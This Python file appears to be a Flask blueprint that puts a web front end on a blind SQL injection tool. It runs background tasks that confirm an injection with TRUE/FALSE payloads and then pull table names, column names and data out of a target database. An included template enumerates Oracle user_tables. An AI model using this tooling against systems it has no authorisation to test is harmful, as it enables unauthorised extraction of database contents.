"""
Blind SQL Injection Tool - Flask Integration
Add this to your tools.py or create a new blindsql_routes.py and import in server.py
"""

from flask import Blueprint, render_template, request, json, session, redirect, url_for
import os
import threading
import uuid
import time
from blindsql import BlindSQLInjector

# Create blueprint
blindsql_bp = Blueprint('blindsql', __name__)


def _parse_candidates(text):
    """Parse the UI candidate textarea into a list of {"col","from"} dicts.
    Format: one candidate per line as  COLUMN || FROM_CLAUSE
    e.g.    table_name || FROM (SELECT table_name, ROWNUM rn FROM user_tables) WHERE rn={rownum}
    Blank/None → use built-in defaults."""
    if not text or not text.strip():
        return None
    out = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "||" not in line:
            continue
        col, frm = line.split("||", 1)
        col, frm = col.strip(), frm.strip()
        if col and frm:
            out.append({"col": col, "from": frm})
    return out or None


# Store active tasks
active_tasks = {}
task_results = {}

class BlindSQLTask:
    def __init__(self, task_id):
        self.task_id = task_id
        self.status = "running"
        self.logs = []
        self.progress = 0.0
        self.results = {"tables": [], "columns": [], "data": []}
        self.lock = threading.Lock()
        self.stop_event = threading.Event()

    def log(self, message):
        with self.lock:
            self.logs.append(message)
            print(f"[{self.task_id}] {message}")

    def update_progress(self, progress):
        with self.lock:
            self.progress = min(progress, 1.0)

    def set_status(self, status):
        with self.lock:
            self.status = status
        if status in ("stopped", "error"):
            self.stop_event.set()

    def update_results(self, key, value):
        with self.lock:
            if key in self.results:
                if isinstance(self.results[key], list):
                    self.results[key].extend(value if isinstance(value, list) else [value])
                else:
                    self.results[key] = value

@blindsql_bp.route("/blindsql")
def blindsql():
    if "username" not in session:
        return redirect(url_for("signin"))
    return render_template("blindsql.html")

@blindsql_bp.route("/blindsql-start", methods=["POST"])
def blindsql_start():
    if "username" not in session:
        return json.dumps({"error": "Unauthorized"}), 401

    data = request.get_json()

    # Validate input
    required_fields = ["raw_request", "injection_point", "injection_type", "true_indicator"]
    for field in required_fields:
        if not data.get(field):
            return json.dumps({"error": f"Missing required field: {field}"}), 400

    # Create task
    task_id = str(uuid.uuid4())
    task = BlindSQLTask(task_id)
    active_tasks[task_id] = task
    task_results[task_id] = task

    # Run injection in background thread
    def run_injection():
        try:
            task.log(f"[*] Starting blind SQL injection...")
            task.log(f"[*] Injection Type: {data['injection_type']}")
            task.log(f"[*] Database Type: {data.get('database_type', 'auto')}")
            task.log(f"[*] Injection Point: {data['injection_point']}")

            injector = BlindSQLInjector(
                raw_request=data["raw_request"],
                injection_point=data["injection_point"],
                injection_type=data["injection_type"],
                true_indicator=data["true_indicator"],
                database_type=data.get("database_type", "auto"),
                logger=task,
                stop_event=task.stop_event,
                case_sensitive=data.get("case_sensitive", False),
                encoding=data.get("encoding", "none"),
                custom_template=data.get("custom_template") or None,
                invert_indicator=data.get("invert_indicator", False),
                where_clause=data.get("where_clause") or None,
                enum_tables_override=_parse_candidates(data.get("enum_tables")),
                enum_columns_override=_parse_candidates(data.get("enum_columns")),
            )

            # Confirm injection with a TRUE/FALSE differential test. A real blind
            # injection makes a TRUE condition look different from a FALSE one.
            # (An "OR 1=1" alone can make everything TRUE → false positives.)
            task.log("[*] Confirming injection (TRUE vs FALSE differential)...")
            task.update_progress(0.1)

            # Time-based needs a resolved dialect; detect first if needed.
            if injector.injection_type == "time" and not injector._dialect_name:
                injector.detect_database()

            # Use the injector's own wrapper so a custom template is respected.
            true_payload  = injector._cond_payload("1=1")
            false_payload = injector._cond_payload("1=2")
            try:
                is_true  = injector._test_payload(true_payload)
                is_false = injector._test_payload(false_payload)
            except Exception as _e:
                task.log(f"[!] error during confirmation: {_e}")
                task.set_status("error")
                return

            if is_true and not is_false:
                task.log("[+] ✓ Injection confirmed (TRUE differs from FALSE)")
            else:
                task.log(f"[!] Could not confirm injection "
                         f"(true={is_true}, false={is_false})")
                task.log("[!] Check the True Indicator and injection point, "
                         "then retry.")
                task.set_status("error")
                return

            task.update_progress(0.2)

            # Perform extraction based on mode
            extraction_mode = data.get("extraction_mode", "tables")

            if extraction_mode == "test":
                task.log("[+] Injection test completed successfully")

            elif extraction_mode == "tables":
                task.log("[*] Extracting table names...")
                task.update_progress(0.3)

                tables = injector.get_table_names()
                if tables:
                    task.log(f"[+] Found {len(tables)} tables:")
                    for table in tables:
                        task.log(f"    - {table}")
                    task.update_results("tables", tables)
                else:
                    task.log("[!] No tables extracted")

                task.update_progress(0.9)

            elif extraction_mode == "columns":
                table_name = data.get("table_name", "")
                if not table_name:
                    task.log("[!] Table name required for columns extraction")
                    task.set_status("error")
                    return

                task.log(f"[*] Extracting columns from table: {table_name}")
                task.update_progress(0.3)

                columns = injector.get_columns(table_name)
                if columns:
                    task.log(f"[+] Found {len(columns)} columns:")
                    for col in columns:
                        task.log(f"    - {col}")
                    task.update_results("columns", columns)
                else:
                    task.log("[!] No columns extracted")

                task.update_progress(0.9)

            elif extraction_mode == "data":
                table_name = data.get("table_name", "")
                column_name = data.get("column_name", "")

                if not table_name or not column_name:
                    task.log("[!] Table and column names required for data extraction")
                    task.set_status("error")
                    return

                task.log(f"[*] Extracting data from {table_name}.{column_name}")
                task.update_progress(0.3)

                extracted_data = injector.extract_data(table_name, column_name, limit=5)
                if extracted_data:
                    task.log(f"[+] Extracted {len(extracted_data)} values:")
                    for i, value in enumerate(extracted_data):
                        task.log(f"    [{i}] {value}")
                    task.update_results("data", extracted_data)
                else:
                    task.log("[!] No data extracted")

                task.update_progress(0.9)

            task.log("[+] Extraction completed!")
            task.update_progress(1.0)
            task.set_status("completed")

        except Exception as e:
            if type(e).__name__ == "StopRequested":
                task.log("[*] Stopped by user.")
                task.set_status("stopped")
            elif "database not identified" in str(e):
                # Clean, actionable message — not a bug, just needs manual DB type.
                task.log(f"[!] {e}")
                task.set_status("error")
            else:
                task.log(f"[!] Error: {str(e)}")
                import traceback
                task.log(f"[!] {traceback.format_exc()}")
                task.set_status("error")

    # Start background thread
    thread = threading.Thread(target=run_injection, daemon=True)
    thread.start()

    return json.dumps({"task_id": task_id, "status": "started"})

@blindsql_bp.route("/blindsql-status/<task_id>")
def blindsql_status(task_id):
    if "username" not in session:
        return json.dumps({"error": "Unauthorized"}), 401

    if task_id not in active_tasks:
        return json.dumps({"error": "Task not found"}), 404

    task = active_tasks[task_id]

    with task.lock:
        return json.dumps({
            "status": task.status,
            "progress": task.progress,
            "logs": task.logs[-20:] if task.logs else [],  # Last 20 logs
            "results": task.results
        })

@blindsql_bp.route("/blindsql-stop/<task_id>", methods=["POST"])
def blindsql_stop(task_id):
    if "username" not in session:
        return json.dumps({"error": "Unauthorized"}), 401

    if task_id in active_tasks:
        task = active_tasks[task_id]
        task.set_status("stopped")  # trips stop_event; keep task for status polling

    return json.dumps({"ok": True})

# Export the blueprint for server.py
# Usage in server.py:
# from blindsql_routes import blindsql_bp
# app.register_blueprint(blindsql_bp)